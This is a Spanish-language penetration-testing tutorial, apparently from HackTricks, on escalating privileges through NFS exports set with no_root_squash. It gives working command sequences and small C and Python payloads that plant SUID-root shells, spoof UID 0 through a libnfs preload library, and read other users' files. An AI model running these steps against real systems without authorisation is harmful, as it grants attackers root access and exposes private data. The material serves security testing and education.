# Escalada de privilegios por una configuración incorrecta de NFS No Root Squash

## Información básica sobre Squashing

Con NFS AUTH_SYS/AUTH_UNIX, el servidor basa las comprobaciones de permisos de archivos en el `uid` y `gid` proporcionados en cada solicitud RPC. Otros security flavors, como Kerberos, utilizan credenciales diferentes, y el servidor puede mapear las credenciales numéricas antes de comprobar los permisos.<sup>[[4]](#references)[[5]](#references)</sup>

- **`all_squash`**: Mapea cada UID y GID a la cuenta anónima, que en Linux es `nobody` (65534) de forma predeterminada. `no_all_squash` es el valor predeterminado para las solicitudes que no son de root.<sup>[[4]](#references)</sup>
- **`root_squash`**: Es el valor predeterminado en Linux y mapea las solicitudes con UID/GID 0 (root) a la cuenta anónima; los demás UIDs y GIDs no se someten a squash.<sup>[[4]](#references)</sup>
- **`no_root_squash`**: Desactiva el root squashing, por lo que las solicitudes con UID/GID 0 pueden evaluarse como root en el servidor.<sup>[[4]](#references)</sup>

Si un cliente autorizado puede montar un export con permisos de escritura en **`/etc/exports`** configurado con **`no_root_squash`**, sus solicitudes con UID/GID 0 pueden escribir allí como el usuario root del servidor.<sup>[[4]](#references)</sup>

Para obtener más información sobre **NFS**, consulta:

{{#ref}}
../../network-services-pentesting/nfs-service-pentesting.md
{{#endref}}

## Escalada de privilegios

### Exploit remoto

Opción 1 usando bash:
- En un cliente autorizado, monta un export con permisos de escritura como root, copia **`/bin/bash`** en él, establece su bit **SUID** y ejecútalo desde un mount de la víctima que no utilice `nosuid`.<sup>[[2]](#references)[[4]](#references)</sup>
- Para que el archivo subido siga siendo propiedad de root, el servidor debe utilizar **`no_root_squash`**. Si root se somete a squash, un binario SUID para otra cuenta solo es posible cuando el cliente puede crearlo o ser su propietario legítimamente con el UID/GID numérico de dicha cuenta.<sup>[[4]](#references)</sup>
```bash
#Attacker, as root user
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /bin/bash .
chmod +s bash

#Victim
cd <SHAREDD_FOLDER>
./bash -p #ROOT shell
```
Opción 2 usando código C compilado:
- Monta el directorio desde un cliente permitido, copia un payload compilado que abuse de los permisos SUID, establece su bit **SUID** y ejecútalo desde la víctima (consulta algunos [payloads SUID en C](../processes-crontab-systemd-dbus/payloads-to-execute.md#c)).
- Mismas restricciones que antes
```bash
#Attacker, as root user
gcc payload.c -o payload
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /tmp/payload .
chmod +s payload

#Victim
cd <SHAREDD_FOLDER>
./payload #ROOT shell
```
### Local Exploit

> [!TIP]
> Ten en cuenta que si puedes crear un **túnel desde tu máquina hasta la máquina víctima, aún puedes usar la versión Remote para explotar esta escalada de privilegios mediante el tunnelling de los puertos necesarios**.\
> El siguiente truco es útil cuando `/etc/exports` restringe la exportación a la IP de la víctima: el cliente remoto no puede montarla, pero la técnica local puede operar a través del recurso compartido ya montado en el host permitido.<sup>[[2]](#references)</sup>\
> Para este método de libnfs sin privilegios, la exportación en **`/etc/exports`** debe usar el flag `insecure` para que el proceso pueda utilizar un puerto de origen no reservado; `secure` es el valor predeterminado, aunque un proceso capaz de enlazar un puerto reservado no necesita esta opción.<sup>[[1]](#references)[[4]](#references)</sup>

### Información básica

Un cliente NFSv3 AUTH_UNIX incluye su UID efectivo, GID y grupos en cada llamada, y el servidor los utiliza para comprobar los permisos. Esta técnica local abusa de ese modelo falsificando las credenciales RPC mediante [libnfs](https://github.com/sahlberg/libnfs); su módulo preload permite sobrescribir el UID/GID en el contexto de NFS.<sup>[[1]](#references)[[2]](#references)[[3]](#references)[[5]](#references)</sup>

#### Compilación de la Library

El ejemplo de libnfs puede requerir ajustes para el kernel objetivo; el walkthrough utilizado aquí señala específicamente que se deben comentar las syscalls de fallocate antes de compilar el módulo preload.<sup>[[1]](#references)[[2]](#references)</sup>
```bash
./bootstrap
./configure
make
gcc -fPIC -shared -o ld_nfs.so examples/ld_nfs.c -ldl -lnfs -I./include/ -L./lib/.libs/
```
#### Realización del Exploit

El ejemplo crea un pequeño helper en C que inicia un shell, luego lo coloca en el recurso compartido y utiliza `ld_nfs.so` con UID 0 en el contexto de NFS para convertirlo en SUID-root.<sup>[[1]](#references)[[2]](#references)</sup>

1. **Compilar el código del exploit:**
```bash
cat pwn.c
int main(void){setreuid(0,0); system("/bin/bash"); return 0;}
gcc pwn.c -o a.out
```
2. **Coloca el exploit en el share y modifica sus permisos falsificando el UID**.<sup>[[1]](#references)[[2]](#references)</sup>
```bash
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so cp ../a.out nfs://nfs-server/nfs_root/
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chown root: nfs://nfs-server/nfs_root/a.out
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod o+rx nfs://nfs-server/nfs_root/a.out
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod u+s nfs://nfs-server/nfs_root/a.out
```
3. **Ejecuta el exploit para obtener privilegios de root**.<sup>[[2]](#references)</sup>
```bash
/mnt/share/a.out
#root
```
### Bonus: Acceso sigiloso a archivos

Una vez obtenido el acceso root, este patrón de `nfsh.py` establece el UID efectivo en el UID del archivo objetivo antes de ejecutar un comando, lo que permite acceder sin cambiar recursivamente la propiedad.<sup>[[2]](#references)</sup>
```python
#!/usr/bin/env python
# script from https://www.errno.fr/nfs_privesc.html
import sys
import os

def get_file_uid(filepath):
try:
uid = os.stat(filepath).st_uid
except OSError as e:
return get_file_uid(os.path.dirname(filepath))
return uid

filepath = sys.argv[-1]
uid = get_file_uid(filepath)
os.setreuid(uid, uid)
os.system(' '.join(sys.argv[1:]))
```
Ejecuta así:
```bash
# ll ./mount/
drwxr-x---  6 1008 1009 1024 Apr  5  2017 9.3_old
```
## References

- [1] [lnv42/libnfs](https://github.com/lnv42/libnfs)
- [2] [Una historia sobre un privesc de NFS menos conocido](https://www.errno.fr/nfs_privesc.html)
- [3] [sahlberg/libnfs](https://github.com/sahlberg/libnfs)
- [4] [exports(5) — página del manual de Linux](https://man7.org/linux/man-pages/man5/exports.5.html)
- [5] [RFC 1813: especificación del protocolo NFS versión 3](https://datatracker.ietf.org/doc/html/rfc1813)
{{#include ../../banners/hacktricks-training.md}}
